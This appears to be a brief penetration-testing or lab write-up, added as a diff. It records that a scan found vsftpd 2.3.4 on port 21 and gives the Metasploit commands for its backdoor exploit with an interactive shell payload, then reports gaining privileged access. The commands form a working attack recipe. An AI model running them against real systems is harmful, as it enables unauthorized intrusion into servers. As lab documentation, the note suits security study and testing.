@@ -1,0 +1,8 @@
+Scan the host for the open service port and found running port 21 (FTP) service.
+Port 21 – Running vsftpd
+version 2.3.4,is exploitable:
+$ use exploit/unix/ftp/vsftpd_234_backdoor
+$ set PAYLOAD cmd/unix/interact
+
+Bingo got privilege access on the server.
+
